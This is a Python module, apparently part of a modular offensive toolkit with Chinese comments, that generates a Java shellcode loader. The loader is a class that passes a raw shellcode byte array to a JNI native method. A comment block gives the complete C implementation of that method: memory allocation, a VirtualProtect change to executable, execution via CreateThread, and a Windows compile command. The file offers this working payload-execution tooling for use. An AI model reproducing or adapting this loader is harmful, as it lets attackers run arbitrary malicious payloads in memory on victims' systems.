#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Java 原始加载器模块：单一职责 - 生成Java原始加载器代码（无解密，直接运行）
"""

class JavaRawLoader:
    """Java 原始加载器（无解密，通过JNI加载运行 Shellcode，适用于未加密 Shellcode）"""
    @staticmethod
    def generate_raw(shellcode_len: int) -> str:
        """生成 Java 原始加载器代码"""
        loader_template = f'''
import java.io.IOException;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;

public class ShellcodeLoader {{
    // 加载本地库
    static {{
        try {{
            // 注意：需要先编译并加载包含native方法实现的动态库
            System.loadLibrary("shellcodeexec");
        }} catch (UnsatisfiedLinkError e) {{
            System.err.println("Error loading native library: " + e.getMessage());
            System.err.println("Please compile and place the native library in the appropriate path.");
            System.exit(1);
        }}
    }}

    // Native方法声明
    private native boolean executeShellcode(byte[] shellcode);

    public static void main(String[] args) {{
        // 请将格式化后的原始 Shellcode 填入此处（替换下方的 new byte[{shellcode_len}]）
        byte[] shellcode = new byte[{shellcode_len}];

        ShellcodeLoader loader = new ShellcodeLoader();
        boolean result = loader.executeShellcode(shellcode);
        
        if (result) {{
            System.out.println("Shellcode executed successfully!");
        }} else {{
            System.out.println("Failed to execute shellcode.");
        }}
    }}
}}

/*
 * 对应的C/C++本地库代码（shellcodeexec.c）：
 * 
 * #include <jni.h>
 * #include <windows.h>
 * #include "ShellcodeLoader.h"
 * 
 * JNIEXPORT jboolean JNICALL Java_ShellcodeLoader_executeShellcode(JNIEnv *env, jobject obj, jbyteArray shellcodeArray) {{
 *     // 获取shellcode长度
 *     jsize shellcodeLen = (*env)->GetArrayLength(env, shellcodeArray);
 *     
 *     // 分配可读写内存
 *     LPVOID allocAddr = VirtualAlloc(NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 *     if (allocAddr == NULL) {{
 *         return JNI_FALSE;
 *     }}
 *     
 *     // 将shellcode复制到分配的内存
 *     (*env)->GetByteArrayRegion(env, shellcodeArray, 0, shellcodeLen, (jbyte*)allocAddr);
 *     
 *     // 修改内存属性为可执行
 *     DWORD oldProtect;
 *     if (!VirtualProtect(allocAddr, shellcodeLen, PAGE_EXECUTE_READ, &oldProtect)) {{
 *         VirtualFree(allocAddr, 0, MEM_RELEASE);
 *         return JNI_FALSE;
 *     }}
 *     
 *     // 创建并执行线程
 *     HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocAddr, NULL, 0, NULL);
 *     if (hThread == NULL) {{
 *         VirtualFree(allocAddr, 0, MEM_RELEASE);
 *         return JNI_FALSE;
 *     }}
 *     
 *     // 等待线程执行完成
 *     WaitForSingleObject(hThread, INFINITE);
 *     
 *     // 清理资源
 *     CloseHandle(hThread);
 *     VirtualFree(allocAddr, 0, MEM_RELEASE);
 *     
 *     return JNI_TRUE;
 * }}
 * 
 * 编译命令（Windows）：
 * cl /LD shellcodeexec.c /I"%JAVA_HOME%\include" /I"%JAVA_HOME%\include\win32"
 */
'''
        return loader_template.strip()
